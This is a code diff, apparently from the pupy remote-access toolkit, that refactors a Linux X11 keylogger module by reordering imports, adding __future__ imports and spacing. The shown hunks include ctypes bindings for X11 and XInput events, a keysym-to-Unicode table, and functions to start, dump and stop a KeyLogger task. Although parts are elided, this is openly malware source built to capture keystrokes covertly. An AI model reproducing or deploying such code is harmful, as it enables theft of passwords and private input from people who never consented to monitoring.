@@ -1,12 +1,19 @@
 # -*- coding: utf-8 -*-
 # inspired from https://github.com/amoffat/pykeylogger
-import sys
-from time import sleep, time
-import ctypes as ct
-from ctypes.util import find_library
-import pupy
+from __future__ import absolute_import
+from __future__ import division
+from __future__ import print_function
+from __future__ import unicode_literals
 
 import os
+import sys
+import ctypes as ct
+
+from io import open
+from time import sleep, time
+from ctypes.util import find_library
+
+import pupy
 
 try:
     x11 = ct.cdll.LoadLibrary(find_library('X11'))
@@ -57,11 +64,13 @@ try:
 except:
     xi = None
 
+
 class ClassHint(ct.Structure):
     _fields_ = [
         ("name", ct.c_char_p),
         ("klass", ct.c_char_p)
     ]
+
 
 class XkbState(ct.Structure):
     _fields_ = [
@@ -81,12 +90,14 @@ class XkbState(ct.Structure):
         ("ptr_buttons", ct.c_char)
     ]
 
+
 class XiEventMask(ct.Structure):
     _fields_ = [
         ("deviceid", ct.c_int),
         ("mask_len", ct.c_int),
         ("mask", ct.c_void_p)
     ]
+
 
 class XGenericEventCookie(ct.Structure):
     _fields_ = [
@@ -100,17 +111,20 @@ class XGenericEventCookie(ct.Structure):
         ("data",        ct.c_void_p)
     ]
 
+
 class XEventType(ct.Structure):
     _fields_ = [
         ("type", ct.c_int),
         ("pad", ct.c_long * 24)
     ]
 
+
 class XEvent(ct.Union):
     _fields_ = [
         ("type",   XEventType),
         ("cookie", XGenericEventCookie),
     ]
+
 
 class XIValuatorState(ct.Structure):
     _fields_ = [
@@ -119,11 +133,13 @@ class XIValuatorState(ct.Structure):
         ("values",     ct.c_void_p),
     ]
 
+
 class XIButtonState(ct.Structure):
     _fields_ = [
         ("mask_len",   ct.c_int),
         ("mask",       ct.c_void_p)
     ]
+
 
 class XIModifierState(ct.Structure):
     _fields_ = [
@@ -132,6 +148,7 @@ class XIModifierState(ct.Structure):
         ("locked",     ct.c_int),
         ("effective",  ct.c_int),
     ]
+
 
 class XIDeviceEvent(ct.Structure):
     _fields_ = [
@@ -159,6 +176,7 @@ class XIDeviceEvent(ct.Structure):
         ("group",      XIModifierState),
     ]
 
+
 class XErrorEvent(ct.Structure):
     _fields_ = [
         ("type",       ct.c_int),
@@ -170,8 +188,10 @@ class XErrorEvent(ct.Structure):
         ("XID",        ct.c_ulong)
     ]
 
+
 def XiMaxLen():
     return (((27) >> 3) + 1)
+
 
 def XiSetMask(mask, event):
     mask[(event)>>3] |= (1 << ((event) & 7))
@@ -515,8 +535,10 @@ KEYSYM_TO_UNICODE_TABLE = {
     0x1eff: u'\u0323', 0xfe60: u'\u0323', 0xfe61: u'\u0309', 0xfe62: u'\u031b',
 }
 
+
 def keysym_to_unicode(ks):
     return KEYSYM_TO_UNICODE_TABLE.get(ks)
+
 
 def keylogger_start(event_id=None):
     if pupy.manager.active(KeyLogger):
@@ -529,10 +551,12 @@ def keylogger_start(event_id=None):
 
     return True
 
+
 def keylogger_dump():
     keylogger = pupy.manager.get(KeyLogger)
     if keylogger:
         return keylogger.results
+
 
 def keylogger_stop():
     keylogger = pupy.manager.get(KeyLogger)
@@ -540,8 +564,10 @@ def keylogger_stop():
         pupy.manager.stop(KeyLogger)
         return keylogger.results
 
+
 class NotAvailable(Exception):
     pass
+
 
 class KeyLogger(pupy.Task):
     results_type = unicode
